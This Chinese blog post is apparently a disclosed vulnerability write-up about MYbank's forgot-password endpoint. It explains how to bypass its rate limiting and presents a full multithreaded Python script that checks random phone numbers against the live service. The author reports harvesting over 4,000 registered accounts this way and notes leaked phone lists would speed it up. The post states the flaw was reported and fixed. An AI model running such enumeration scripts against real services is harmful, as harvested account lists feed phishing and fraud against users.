---
layout: post
title: Alipay Mybank Account Random Verify
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;昨天有朋友问我："为什么新注册的手机号绑定了某理财账户，没过一天就收到了诈骗短信？"那可能是你运气比较好。想起了之前针对网商银行（阿里巴巴旗下的民营银行）强怼出来的一个漏洞。没什么技术含量，但可以参考。<br>
扫账户这种漏洞对于金融行业来说是很难见到的，因为黑产可以拿这些账户进行诈骗，支付宝全线每个点都做了限频处理。

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下载了个网商银行各点抓包看了下，在未登录口的忘记密码这个点随便输入一个手机号：

<img src="http://7xiw31.com1.z0.glb.clouddn.com/fetchImage.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;输入一个我注册过的手机号：

<img src="http://7xiw31.com1.z0.glb.clouddn.com/fetchImage-1.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本来以为这个地方也限频了，毕竟支付宝产品线虽然复杂，但限频做的还挺全面的。测试发现的确是限频了，只是比较鸡肋。真正导致返回系统异常的是因为process_context_id被销毁了：

<img src="http://7xiw31.com1.z0.glb.clouddn.com/fetchImage-2.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不知道这个后端是怎么设计的，process_context_id使用多少次后还是多长时间后被销毁不是很固定，或许是有相应的算法吧。这个process_context_id取自每次点击忘记密码时生成的，https://safecenter.mybank.cn/account/process.htm，然后再点击请求时传递回去进行校验：

<img src="http://7xiw31.com1.z0.glb.clouddn.com/aaaa3werfdb.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Fuzz了下https://safecenter.mybank.cn/account/process.htm没有限频。既然这个点没有限频，那就索性每次手机号验证请求一次拿一次process_context_id吧，毕竟来回判断这个process_context_id是否被销毁并不靠谱。

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;开始写代码，号码就选择随机生成了，如果从一些其他的裤子中抽取一批手机号进行验证的话结果会更多更快吧。

```
#!/usr/bin/env python
#coding:utf-8

import sys
import bs4
import json
import random
import requests
import threadpool as tp

def get_process_context_id():
	r = requests.get('https://safecenter.mybank.cn/account/process.htm?service_name=reset_logon_password&userType=individual&deviceId=WHnP9B9Km4gDAEFQCPw4G2ea')
	soup = bs4.BeautifulSoup(r.text)
	process_context_id = soup.find_all('input')[1]['value']
	return process_context_id

def mybank_verify(args):
	flag = 0
	while True:
		flag += 1
		phone_random = random.choice(['138','136','139','151','153','188','186','135'])+"".join(random.sample("0123456789",8))
		headers = {
			'Host':'safecenter.mybank.cn',
			'Connection':'keep-alive',
			'Accept':'application/json',
			'Origin':'https://safecenter.mybank.cn',
			'X-Requested-With':'XMLHttpRequest',
			'Content-Type':'application/x-www-form-urlencoded',
			'Referer':'https://safecenter.mybank.cn/account/process.htm?service_name=reset_logon_password&userType=individual&&deviceId=WHnP9B9Km4gDAEFQCPw4G2ea',
			'Accept-Encoding':'gzip, deflate',
			'Accept-Language':'zh-CN,en-US;q=0.8',
			'Cookie':'...'
		}
		payload = {
			'ctoken':'...',
			'process_context_id':get_process_context_id(),
			'service_name':'reset_logon_password',
			'username':phone_random,
			'deviceId':'...',
			'apdidToekn':'...',
			'umidToken':'...',
			'rdsData':'undefined'
		}
		url = 'https://safecenter.mybank.cn/account/process.json'
		r = requests.post(url,headers=headers,data=payload)
		print '[%d] Test Phone: %s' % (flag,payload['username'])
		if json.loads(r.content)['info']['success'] == True:
			print '[ok] %s' % payload['username']
			f = open('mybank_account.txt','a')
			f.write(payload['username']+'\n')
			f.close()

if __name__ == '__main__':
	args = []
	for i in range(200):
		args.append(i)
	pool = tp.ThreadPool(100)
	reqs = tp.makeRequests(mybank_verify,args)
	[pool.putRequest(req) for req in reqs]
	pool.wait()
	pool.dismissWorkers(100,do_join=True)
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;分别挂在两台机器上跑几个小时看看，竟然没有触发风控？

<img src="http://7xiw31.com1.z0.glb.clouddn.com/fetchImage-4.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;停下了脚本，看结果爆破出4000多注册账户：

<img src="http://7xiw31.com1.z0.glb.clouddn.com/fetchImage-7.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;照这个速度一天跑出2万+是没有问题的。这也证实了那位朋友所发生的事，此案例只是其中之一。

> Timeline：

* 20170409 public via @Tr3jer_CongRong
* 20170116 mybank confirm and fix
* 20170115 report vul detail to afsrc


